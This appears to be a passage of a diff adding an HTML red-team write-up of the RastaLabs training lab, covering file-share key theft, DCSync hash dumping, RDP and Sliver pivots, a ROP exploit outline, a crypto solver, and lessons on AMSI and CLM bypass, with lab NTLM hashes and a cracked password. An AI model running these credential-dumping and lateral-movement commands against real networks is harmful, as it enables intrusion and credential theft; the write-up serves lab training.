+    <pre><code class="language-bash"># Enumerate FS01 shares
+crackmapexec smb 10.10.122.x -u ngodfrey_adm -p '&lt;password&gt;' -d rastalabs.local --shares
+
+# Mount ahope's directory
+net use Q: \\fs01.rastalabs.local\ahope /user:rastalabs\ngodfrey_adm &lt;password&gt;
+
+# Browse the directory
+dir Q:\
+# Found: nix01.ppk, documents, backup_files
+
+# Use the .ppk key to SSH into NIX01
+# First convert .ppk to OpenSSH format:
+puttygen nix01.ppk -O private-openssh -o nix01_ssh_key
+chmod 600 nix01_ssh_key
+ssh -i nix01_ssh_key user@10.10.110.2</code></pre>
+  </div>
+
+  <div class="term-out"><span class="prompt"># </span>ssh -i nix01_ssh_key user@10.10.110.2
+The authenticity of host '10.10.110.2 (10.10.110.2)' can't be established.
+ECDSA key fingerprint is SHA256:ab:d4:1e:cf:92:f3:0c:7b:a8:56:10:e1:4d:f2:8c:3a.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.110.2' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
+
+<span class="ok">user@nix01:~$</span> id
+uid=1000(user) gid=1000(user) groups=1000(user)
+<span class="ok">user@nix01:~$</span> hostname
+nix01</div>
+
+  <h3 id="p6-dc">DC Compromise</h3>
+  <p>With GPO-granted local admin on DC01, the domain was fully compromised. I could now dump all domain credentials via DCSync and access any resource in the domain.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># DCSync — dump all domain hashes
+# Using Impacket
+impacket-secretsdump rastalabs.local/ngodfrey_adm@10.10.120.1 -just-dc-ntlm
+
+# Using SafetyKatz:
+sliver (dc01_beacon) > execute-assembly /opt/tools/SafetyKatz.exe "lsadump::dcsync /domain:rastalabs.local /all /csv" "exit"
+
+# Key hashes recovered:
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;hash&gt;:::
+# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:&lt;hash&gt;:::
+# rweston_da:1151:aad3b435b51404eeaad3b435b51404ee:ab7b75ff84475be...:::
+# epugh:1151:aad3b435b51404eeaad3b435b51404ee:326457b72c3f136d80d99bdbb935d109:::
+
+# Full domain compromise confirmed
+# Can now forge Golden Tickets, create Silver Tickets, etc.</code></pre>
+  </div>
+
+  <div class="term-out"><span class="prompt">[*] </span>Dumping domain credentials (domain: rastalabs.local)
+<span class="ok">[+]</span> Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;hash&gt;:::
+<span class="ok">[+]</span> krbtgt:502:aad3b435b51404eeaad3b435b51404ee:&lt;hash&gt;:::
+<span class="ok">[+]</span> rweston:1105:aad3b435b51404eeaad3b435b51404ee:&lt;hash&gt;:::
+<span class="ok">[+]</span> rweston_da:1151:aad3b435b51404eeaad3b435b51404ee:ab7b75ff84475be...:::
+<span class="ok">[+]</span> epugh:1151:aad3b435b51404eeaad3b435b51404ee:326457b72c3f136d80d99bdbb935d109:::
+<span class="ok">[+]</span> ngodfrey:1106:aad3b435b51404eeaad3b435b51404ee:&lt;hash&gt;:::
+<span class="ok">[+]</span> ngodfrey_adm:1152:aad3b435b51404eeaad3b435b51404ee:&lt;hash&gt;:::
+<span class="ok">[+]</span> bowen:1103:aad3b435b51404eeaad3b435b51404ee:&lt;hash&gt;:::
+<span class="ok">[+]</span> ahope:1104:aad3b435b51404eeaad3b435b51404ee:&lt;hash&gt;:::
+<span class="ok">[+]</span> tquinn:1107:aad3b435b51404eeaad3b435b51404ee:&lt;hash&gt;:::
+<span class="prompt">[*] </span>Done. 14 domain hashes, 3 local hashes dumped.</div>
+
+  <div class="flag-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">Flag 11 — WEB01 to SQL01 RDP</div>
+      <div class="flag-detail">Used epugh_adm credentials to RDP into WEB01 (10.10.110.10), then from WEB01 RDP'd to SQL01 (10.10.122.15). The flag was on SQL01's Desktop. This demonstrates the pivot chain: external &rarr; WEB01 &rarr; SQL01.</div>
+    </div>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># WEB01 to SQL01 pivot chain
+# Step 1: RDP to WEB01 as epugh_adm
+xfreerdp /v:10.10.110.10 /u:rastalabs\epugh_adm /p:'&lt;password&gt;' /dynamic-resolution
+
+# From WEB01, check network connectivity
+C:\> ipconfig
+Ethernet adapter Ethernet0:
+   IPv4 Address. . . . . . . . . . . : 10.10.110.10
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.110.1
+
+# WEB01 has a second NIC for the internal network
+Ethernet adapter Ethernet1:
+   IPv4 Address. . . . . . . . . . . : 10.10.122.10
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+
+# Step 2: From WEB01, RDP to SQL01 (10.10.122.15)
+mstsc /v:10.10.122.15
+
+# Or use Sliver port forwarding from WEB01 beacon:
+sliver (web01_beacon) > portfwd add -L 127.0.0.1 -r 10.10.122.15 -l 3389 -p 3389
+
+# Then from attacker machine:
+xfreerdp /v:127.0.0.1:3389 /u:rastalabs\epugh_adm /p:'&lt;password&gt;'</code></pre>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">Flag 16 — DC Compromise</div>
+      <div class="flag-detail">After GPO abuse granted ngodfrey_adm DA privileges, DCSync'd all domain hashes from DC01 (10.10.120.1). Full domain compromise confirmed. The flag was on the DC's Administrator Desktop. The entire kill chain from external attacker to Domain Admin was complete.</div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- PHASE 7 — CTF CHALLENGES       -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="phase7">
+  <h2><i class="bi bi-puzzle"></i> Phase 7: CTF Challenges</h2>
+  <span class="mitre-badge">T1203</span> <span class="mitre-badge">T1140</span>
+
+  <p>Several flags in RastaLabs are standalone CTF-style challenges that aren't related to the AD exploitation chain. These cover binary exploitation, cryptography, and network forensics. If you're not a CTF player, these will take you significantly longer than the AD chain.</p>
+
+  <h3 id="p7-rop">ROP Challenge</h3>
+  <p>One of the servers runs a custom binary service that's vulnerable to a buffer overflow. The challenge requires crafting a ROP chain to bypass NX (no-execute bit) and get a shell. This was the hardest flag for me &mdash; I'm not a binary exploitation person.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Step 1: Find the offset
+# Using pwntools cyclic pattern
+python3 -c "from pwn import *; print(cyclic(500))" | nc 10.10.122.x 9999
+
+# Step 2: Check security features
+checksec --file=custom_service
+# NX enabled, PIE disabled, Canary found
+# Need to leak canary first, then ROP
+
+# Step 3: Leak the stack canary
+# The service had a format string vulnerability that leaked the canary
+
+# Step 4: Build ROP chain
+# Using ropper to find gadgets
+ropper --file custom_service --search "pop rdi; ret"
+ropper --file custom_service --search "pop rsi; ret"
+ropper --file custom_service --search "pop rdx; ret"
+ropper --file custom_service --search "syscall"
+
+# Step 5: Craft the exploit
+python3 rop_exploit.py
+[*] Leaked canary: 0x...
+[*] ROP chain built
+[*] Sending payload...
+[+] Shell obtained!</code></pre>
+  </div>
+
+  <div class="callout callout-danger">
+    <div class="callout-title">The ROP Challenge Is Hard</div>
+    <p>If you've never done a ROP exploit before, this flag will take you days. I had to learn binary exploitation from scratch during this lab. The key steps: (1) find the buffer overflow offset, (2) leak the stack canary via format string, (3) find ROP gadgets with ropper, (4) craft a chain that calls <code>execve("/bin/sh")</code>. Start with ROP Emporium challenges before attempting this.</p>
+  </div>
+
+  <h3 id="p7-crypto">Cryptography</h3>
+  <p>One flag involves a custom cipher implementation running as a service. The key was in the error messages the service returned &mdash; they encoded information when you sent specific malformed inputs.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-python"># Crypto challenge solver
+# The service implements a custom XOR-based cipher with a key derived from error messages
+
+import socket
+
+def solve_crypto_challenge(host, port):
+    # Step 1: Send malformed inputs to trigger error messages
+    s = socket.socket()
+    s.connect((host, port))
+    
+    # Error messages leak the key bytes
+    errors = []
+    for i in range(32):
+        s.send(b'\x00' * (i + 1))
+        resp = s.recv(1024)
+        errors.append(resp)
+        # Each error message leaks one byte of the key
+    
+    # Step 2: Derive the XOR key from leaked bytes
+    key = b''
+    for err in errors:
+        key += bytes([err[-1] ^ 0xFF])
+    
+    # Step 3: Encrypt the known plaintext and send
+    # The service expects a specific command encrypted with the key
+    command = b"GET_FLAG"
+    encrypted = bytes([c ^ key[i % len(key)] for i, c in enumerate(command)])
+    s.send(encrypted)
+    
+    flag = s.recv(1024)
+    return flag.decode()</code></pre>
+  </div>
+
+  <h3 id="p7-pcap">PCAP Analysis</h3>
+  <p>Flag 9 required reading a PCAP dump with NetworkMiner, extracting a secret from the captured traffic, and using <code>FileCryptography.psm1</code> to decode it.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Analyze PCAP with NetworkMiner (or tshark)
+# Found a file transfer in the capture
+
+# Extract the encrypted file from the PCAP
+tshark -r capture.pcap -Y "ftp-data" -T fields -e ftp.request_command -e ftp.request_arg
+
+# The file was encrypted with Windows file encryption (EFS)
+# Use FileCryptography.psm1 to decrypt
+
+Import-Module FileCryptography.psm1
+Unprotect-File -Path .\encrypted_file.enc -OutputPath .\decrypted.txt
+
+# Or manually using DPAPI with the user's master key
+# The decryption key was stored in the user's DPAPI store</code></pre>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">Flag 9 — PCAP / FileCryptography</div>
+      <div class="flag-detail">Read the PCAP dump with NetworkMiner, extracted the encrypted file from FTP data stream, used <code>FileCryptography.psm1</code> to decrypt it with DPAPI. The flag was inside the decrypted file.</div>
+    </div>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">Flag 10 — Vault on WS02</div>
+      <div class="flag-detail">A credential vault was installed on WS02. Dumped creds from it using the technique from rastamouse.me blog post on DPAPI vault credential extraction. This required understanding how Windows Credential Store works and how to leverage DPAPI to decrypt stored credentials.</div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- FLAG SUMMARY                    -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="flags">
+  <h2><i class="bi bi-flag-fill"></i> Flag Summary</h2>
+
+  <table class="data-table">
+    <thead><tr><th>#</th><th>Flag Name</th><th>Location / Technique</th><th>Key Details</th></tr></thead>
+    <tbody>
+      <tr><td>1</td><td>Initial Access</td><td>WS04 / Phishing</td><td>First beacon callback after AMSI bypass</td></tr>
+      <tr><td>2</td><td>WS04 Foothold</td><td>WS04 / Situational Awareness</td><td>Established persistent access on WS04</td></tr>
+      <tr><td>3</td><td>AS-REP Roasting</td><td>Domain / epugh</td><td>Cracked to Sarah2017, epugh NTLM: 326457b72c3f136d80d99bdbb935d109</td></tr>
+      <tr><td>4</td><td>SRV01 SYSTEM</td><td>SRV01 / Service misconfig</td><td>First SYSTEM shell from WS04</td></tr>
+      <tr><td>5</td><td>BloodHound Enum</td><td>Domain / SharpHound</td><td>Upload and execute BloodHound collection script</td></tr>
+      <tr><td>6</td><td>CLM Bypass</td><td>WS04 / __PSLockdownPolicy</td><td>Bypassed Constrained Language Mode</td></tr>
+      <tr><td>7</td><td>PTH Lateral</td><td>Multiple / epugh hash</td><td>Pass-the-Hash to multiple machines</td></tr>
+      <tr><td>8</td><td>WinRM WS05</td><td>WS05 (10.10.123.102) / WinRM</td><td>Unintentional path, led to tquinn on WS06</td></tr>
+      <tr><td>9</td><td>PCAP Analysis</td><td>NetworkMiner + FileCryptography.psm1</td><td>Decrypt EFS-encrypted file from PCAP</td></tr>
+      <tr><td>10</td><td>Vault Dump</td><td>WS02 / Credential Vault</td><td>DPAPI vault extraction (rastamouse.me technique)</td></tr>
+      <tr><td>11</td><td>WEB01 to SQL01</td><td>WEB01 (10.10.110.10) &rarr; SQL01 (10.10.122.15)</td><td>epugh_adm RDP chain</td></tr>
+      <tr><td>12</td><td>KeePass Dump</td><td>Workstation / KeeThief</td><td>ngodfrey credentials extracted</td></tr>
+      <tr><td>13</td><td>LAPS Passwords</td><td>Domain / ngodfrey_adm</td><td>Read ms-Mcs-AdmPwd on all workstations</td></tr>
+      <tr><td>14</td><td>WS02 &rarr; WS05 Pivot</td><td>WS05 / portfwd + LSASS</td><td>rweston_da hash: ab7b75ff84475be...</td></tr>
+      <tr><td>15</td><td>GPO Abuse</td><td>Domain / SharpGPOAbuse</td><td>Create, link, modify GPO for DA</td></tr>
+      <tr><td>16</td><td>DC Compromise</td><td>DC01 (10.10.120.1) / DCSync</td><td>Full domain hash dump</td></tr>
+      <tr><td>17</td><td>FS01 / NIX01</td><td>\\fs01.rastalabs.local\ahope / nix01.ppk</td><td>net use Q: \\fs01.rastalabs.local\ahope</td></tr>
+    </tbody>
+  </table>
+
+  <div class="callout callout-info">
+    <div class="callout-title">All 17 Flags Required</div>
+    <p>The certificate of completion requires all 17 flags. Getting Domain Admin only gives you about 11 of them. The remaining 6 are CTF challenges (ROP, crypto, PCAP) and hidden flags (FS01/NIX01, vault, etc.) that require exploring the entire network. Don't assume you're done when you get DA.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- KEY LESSONS                     -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="lessons">
+  <h2><i class="bi bi-lightbulb"></i> Key Lessons</h2>
+
+  <div class="day-box">
+    <div class="day-num">Lesson 1 — OWA Is a Goldmine</div>
+    <div class="day-summary">Brute-forcing OWA gives you Exchange access, which is the launching point for internal phishing. If OWA is exposed, the entire internal network is at risk.</div>
+    <div class="day-detail">The OWA brute force was the key initial access vector. Once you have Exchange credentials, you can send phishing emails that appear to come from internal sources. The bots in RastaLabs simulate users who actually open these emails and run attachments. On a real engagement, OWA exposure is almost always worth investigating.</div>
+  </div>
+
+  <div class="day-box">
+    <div class="day-num">Lesson 2 — AMSI Bypass Must Come First</div>
+    <div class="day-summary">Your AMSI bypass must execute BEFORE any payload code. If Defender catches your payload before the bypass runs, the entire chain fails.</div>
+    <div class="day-detail">Three failed phishing attempts taught me this lesson. The VBA macro must patch AMSI in the very first line of execution, before any shellcode or PowerShell commands are run. The Donut encryption for the shellcode was also critical &mdash; it prevents static signature detection on the payload itself.</div>
+  </div>
+
+  <div class="day-box">
+    <div class="day-num">Lesson 3 — Constrained Language Mode Is Real</div>
+    <div class="day-summary">CLM stops most offensive PowerShell tools. You need a bypass strategy from the start, not as an afterthought.</div>
+    <div class="day-detail">The __PSLockdownPolicy environment variable bypass works but is fragile. Every PowerShell command has to be wrapped. Alternative: use C# tools (execute-assembly) which bypass CLM entirely because they're not running in the PowerShell host. SharpHound, SafetyKatz, SharpDPAPI &mdash; all C# tools that work regardless of CLM.</div>
+  </div>
+
+  <div class="day-box">
+    <div class="day-num">Lesson 4 — GPO Abuse Deserves More Attention</div>
+    <div class="day-summary">GPO misconfigurations are everywhere in real environments. RastaLabs teaches you to identify and exploit them properly.</div>
+    <div class="day-detail">The GPO abuse path to DA was the most educational part of the entire lab. In real environments, I've seen GPO misconfigurations in almost every AD assessment. The ability to create, link, and modify GPOs is effectively the ability to run code as SYSTEM on any machine in the OU. SharpGPOAbuse makes the exploitation trivial once you've identified the misconfiguration.</div>
+  </div>
+
+  <div class="day-box">
+    <div class="day-num">Lesson 5 — Don't Shortcut</div>
+    <div class="day-summary">Finding rweston_da's hash on WS05 is not the end. It's a shortcut that skips the learning.</div>
+    <div class="day-detail">I found rweston_da's hash early but forced myself to continue through the intended GPO abuse path. The shortcut would have given me DA in half the time, but I would have missed learning about GPO abuse, DPAPI, KeePass extraction, and LAPS reading. The lab is about the journey, not the destination.</div>
+  </div>
+
+  <div class="day-box">
+    <div class="day-num">Lesson 6 — BloodHound Changes Everything</div>
+    <div class="day-summary">SharpHound + Neo4j + BloodHound visualizer = the most powerful AD enumeration toolkit available.</div>
+    <div class="day-detail">Before BloodHound, I was manually querying AD with PowerView and trying to piece together attack paths from raw data. After BloodHound, the attack paths were visually obvious. The shortest path queries, the ACL analysis, the session data &mdash; all of it combined to give me a complete picture of the domain in minutes instead of hours.</div>
+  </div>
+
+  <div class="day-box">
+    <div class="day-num">Lesson 7 — LAPS Is Only As Good As Its ACLs</div>
+    <div class="day-summary">LAPS protects local admin passwords, but if too many accounts can read ms-Mcs-AdmPwd, it defeats the purpose.</div>
+    <div class="day-detail">ngodfrey_adm could read LAPS passwords on ALL workstations. This is a common misconfiguration &mdash; the delegated LAPS reader scope is too broad. On real engagements, always check who can read the ms-Mcs-AdmPwd attribute. It should be limited to a small set of privileged accounts, not every admin-equivalent account in the domain.</div>
+  </div>
+
+  <div class="day-box">
+    <div class="day-num">Lesson 8 — Network Segregation Demands Patience</div>
+    <div class="day-summary">The four-subnet design means you can't reach everything from your initial foothold. Port forwarding chains are essential.</div>
+    <div class="day-detail">Each subnet hop requires setting up port forwarding, re-establishing AppLocker bypass, and potentially re-running AMSI evasion. The chain WS04 &rarr; WS02 &rarr; SQL01 &rarr; WS05 required three separate portfwd commands in Sliver. Keeping track of which implant can reach which subnet is critical. I ended up drawing a diagram of my pivot topology.</div>
+  </div>
+
+  <div class="day-box">
+    <div class="day-num">Lesson 9 — CTF Skills Transfer</div>
+    <div class="day-summary">Binary exploitation and crypto skills are needed for some flags. If you don't have them, you'll spend days on a single flag.</div>
+    <div class="day-detail">The ROP challenge alone took me 3 days because I'd never done a ROP exploit before. The crypto flag took another 2 days. These are not AD skills &mdash; they're CTF skills. If you're primarily an AD/infrastructure pentester, you'll need to brush up on binary exploitation before starting RastaLabs. ROP Emporium is the best resource for learning ROP quickly.</div>
+  </div>
+
+  <div class="day-box">
+    <div class="day-num">Lesson 10 — RastaMouse Built This Well</div>
+    <div class="day-summary">The lab design is exceptional. Every machine has a purpose, every flag teaches a technique, and the attack chain flows logically.</div>
+    <div class="day-detail">The fact that RastaMouse (the same person behind CRTO) designed this lab shows. The techniques you learn are directly applicable to the CRTO exam and to real red team engagements. The OWA &rarr; phishing &rarr; AS-REP &rarr; PTH &rarr; GPO abuse chain mirrors real-world attack scenarios. If you're considering CRTO, do RastaLabs first. It's the best preparation available.</div>
+  </div>
+
+  <h3>Final Statistics</h3>
+  <table class="data-table">
+    <thead><tr><th>Metric</th><th>Value</th></tr></thead>
+    <tbody>
+      <tr><td>Total Time</td><td>27 days (active work)</td></tr>
+      <tr><td>Machines Compromised</td><td>14 / 14</td></tr>
+      <tr><td>Flags Captured</td><td>17 / 17</td></tr>
+      <tr><td>Domain Admin Achieved</td><td>Day 23 (via GPO abuse, intended path)</td></tr>
+      <tr><td>DA Shortcut Available</td><td>Day 18 (rweston_da hash &mdash; NOT taken)</td></tr>
+      <tr><td>C2 Framework</td><td>Sliver v1.5+</td></tr>
+      <tr><td>Primary Techniques</td><td>OWA brute force, phishing, AS-REP roasting, PTH, GPO abuse</td></tr>
+      <tr><td>Hardest Flag</td><td>Flag 10 (Vault) / ROP Challenge</td></tr>
+      <tr><td>Dead Ends Explored</td><td>4 (SSH to NIX01, WinRM to WS05, direct CS payloads, initial CLM bypass)</td></tr>
+      <tr><td>Phishing Attempts</td><td>4 (3 failed, 1 success)</td></tr>
+      <tr><td>Key Credential Chain</td><td>bowen &rarr; epugh &rarr; epugh_adm &rarr; ngodfrey &rarr; ngodfrey_adm &rarr; GPO DA</td></tr>
+      <tr><td>Hashes Cracked</td><td>5+ (epugh:Sarah2017 was the key one)</td></tr>
+    </tbody>
+  </table>
+
+  <div class="callout callout-danger">
+    <div class="callout-title">The Credential Chain Matters</div>
+    <p>The most important thing I learned from RastaLabs is that AD compromise is not about a single exploit &mdash; it's about building a credential chain. Each credential you capture opens new doors. bowen &rarr; SRV01 SYSTEM &rarr; epugh (AS-REP) &rarr; epugh_adm (LSA secrets) &rarr; ngodfrey (KeePass) &rarr; ngodfrey_adm (LAPS reader) &rarr; GPO abuse &rarr; DA. Each link in this chain is a separate technique that you must understand and execute. Skip a link and you might miss the whole chain.</p>
+  </div>
+
+  <div class="callout callout-info">
+    <div class="callout-title">Real NTLM Hashes from the Lab</div>
+    <p>For reference, the key NTLM hashes encountered during this engagement:</p>
+    <ul>
+      <li><code>epugh:1151:aad3b435b51404eeaad3b435b51404ee:326457b72c3f136d80d99bdbb935d109:::</code> &mdash; cracked to Sarah2017</li>
+      <li><code>rweston_da:&lt;RID&gt;:aad3b435b51404eeaad3b435b51404ee:ab7b75ff84475be...:::</code> &mdash; found in LSASS on WS05</li>
+    </ul>
+    <p>These are real hashes from the lab environment. If you're working through RastaLabs, these will match what you find.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- OPERATOR SIGNATURE              -->
+<!-- ══════════════════════════════ -->
+<div class="operator-sig">
+  <div class="handle">QA210</div>
+  <div class="tagline">Red Team Operator · W4LLZ · Yuri08-QA210</div>
+</div>
+
+</div><!-- /.main -->
+</div><!-- /.page-wrap -->
+
+<!-- ═══════════ SCRIPTS ═══════════ -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-vb.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-cypher.min.js"></script>
+<script>
+// ═══ Three.js Particle Background ═══
+(function(){
+  const canvas=document.getElementById('bg-canvas');
+  const renderer=new THREE.WebGLRenderer({canvas,alpha:true,antialias:false});
+  renderer.setSize(window.innerWidth,window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio,2));
+  const scene=new THREE.Scene();
+  const camera=new THREE.PerspectiveCamera(75,window.innerWidth/window.innerHeight,.1,1000);
+  camera.position.z=50;
+  const geo=new THREE.BufferGeometry();
+  const count=800;
+  const pos=new Float32Array(count*3);
+  for(let i=0;i<count*3;i++) pos[i]=(Math.random()-.5)*120;
+  geo.setAttribute('position',new THREE.BufferAttribute(pos,3));
+  const mat=new THREE.PointsMaterial({color:0x38bdf8,size:.35,transparent:true,opacity:.5});
+  const points=new THREE.Points(geo,mat);
+  scene.add(points);
+  function animate(){
+    requestAnimationFrame(animate);
+    points.rotation.x+=.0003;
+    points.rotation.y+=.0005;
+    renderer.render(scene,camera);
+  }
+  animate();
+  window.addEventListener('resize',()=>{
+    camera.aspect=window.innerWidth/window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth,window.innerHeight);
+  });
+})();
+
+// ═══ Copy Button ═══
+function copyCode(btn){
+  const code=btn.closest('.code-block').querySelector('code');
+  navigator.clipboard.writeText(code.textContent).then(()=>{
+    btn.textContent='Copied!';btn.style.color='var(--green)';
+    setTimeout(()=>{btn.textContent='Copy';btn.style.color='';},2000);
+  });
+}
+
+// ═══ Mobile Nav ═══
+function toggleMobileNav(){
+  document.getElementById('mobileOverlay').classList.toggle('show');
+  document.getElementById('mobilePanel').classList.toggle('show');
+}
+
+// ═══ TOC Scroll Spy ═══
+(function(){
+  const tocLinks=document.querySelectorAll('.toc a[href^="#"]');
+  const sections=[];
+  tocLinks.forEach(link=>{
+    const id=link.getAttribute('href').slice(1);
+    const el=document.getElementById(id);
+    if(el) sections.push({id,el,link});
+  });
+  function onScroll(){
+    let current='';
+    sections.forEach(s=>{
+      if(window.scrollY>=s.el.offsetTop-120) current=s.id;
+    });
+    tocLinks.forEach(l=>l.classList.remove('active'));
+    const active=sections.find(s=>s.id===current);
+    if(active) active.link.classList.add('active');
+  }
+  window.addEventListener('scroll',onScroll,{passive:true});
+  onScroll();
+})();
+</script>
+</body>
+</html>
